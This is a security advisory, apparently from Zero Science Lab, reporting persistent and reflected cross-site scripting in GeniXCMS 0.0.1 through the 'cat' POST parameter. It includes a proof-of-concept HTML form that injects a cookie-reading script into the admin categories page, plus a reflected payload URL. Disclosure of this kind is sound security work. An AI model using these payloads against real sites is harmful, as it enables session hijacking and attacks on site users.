@@ -1,0 +1,55 @@
+
+GeniXCMS v0.0.1 Persistent Script Insertion Vulnerability
+
+Vendor: MetalGenix
+Product web page: http://www.genixcms.org
+Affected version: 0.0.1
+
+Summary: GenixCMS is a PHP Based Content Management System and Framework (CMSF).
+It's a simple and lightweight of CMSF. Very suitable for Intermediate PHP developer to
+Advanced Developer. Some manual configurations are needed to make this application to
+work.
+
+Desc: Input passed to the 'cat' POST parameter is not properly sanitised before being
+returned to the user. This can be exploited to execute arbitrary HTML and script code
+in a user's browser session in context of an affected site.
+
+Tested on: nginx/1.4.6 (Ubuntu)
+           Apache 2.4.10 (Win32)
+           PHP 5.6.3
+           MySQL 5.6.21
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5233
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5233.php
+
+
+05.03.2015
+
+---
+
+
+Stored:
+-------
+
+<html>
+  <body>
+    <form action="http://localhost/genixcms/gxadmin/index.php?page=categories" method="POST">
+      <input type="hidden" name="parent" value="2" />
+      <input type="hidden" name="cat" value='"><script>alert(document.cookie)</script>' />
+      <input type="hidden" name="addcat" value="" />
+      <input type="submit" value="Insert" />
+    </form>
+  </body>
+</html>
+
+
+
+Reflected:
+----------
+
+http://localhost/genixcms/index.php?page=1<script>confirm("ZSL")</script>'
